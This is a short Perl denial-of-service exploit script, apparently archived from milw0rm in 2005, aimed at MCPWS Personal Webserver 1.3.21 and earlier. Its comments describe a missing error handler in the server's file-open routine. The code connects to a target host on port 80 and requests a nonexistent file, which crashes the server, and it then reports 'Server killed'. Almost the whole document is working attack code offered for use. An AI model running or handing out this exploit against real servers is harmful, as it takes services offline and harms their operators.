#!/usr/bin/perl

#  MCPWS Personal - Webserver <= 1.3.21 DoS Exploit
#  Vendor: http://www.mcpsoftware.de
#
#  The coder used a unsecure VB-function (Open) to open requested files
#  and didn't include a working error handling (On Error Goto etc).
#  It's possible to exploit this vulnerability by requesting files
#  that don't exist. Successful exploitation results 
#  in a runtime error that stops the process.
#
#  Nico Spicher [http://triplex.it-helpnet.de/]

use IO::Socket;

if (@ARGV < 1)
 {
system "clear";
print "[-] MCPWS Personal-Web Server <= 1.3.21 DoS Exploit\n\n";
print "[-] Usage: dos_mcpws.pl <host ip>\n";
exit(1);
 }
system "clear";

$server = $ARGV[0];
system "clear";
print "[-] MCPWS Personal-Web Server <= 1.3.21 DoS Exploit\n\n";
print "[-] Server IP: ";
print $server;
print "\n[-] Connecting to IP ...\n";

$socket = IO::Socket::INET->new(
	Proto => "tcp",
	PeerAddr => "$server",
	PeerPort => "80"); unless ($socket) { die "[-] $server is offline\n" }

print "[-] Connected\n\n";

print "[-] Creating string\n";

  $string="ABCDEFGHIJKLMNOPQRSTUVWXYZ"; 
# This file shouldn't exist :)

print "[-] Sending string\n\n";

print $socket "GET /".$string." HTTP/1.1\r\n\r\n";

print "[>] Attack successful - Server killed\n";
close($socket);

# milw0rm.com [2005-03-21]
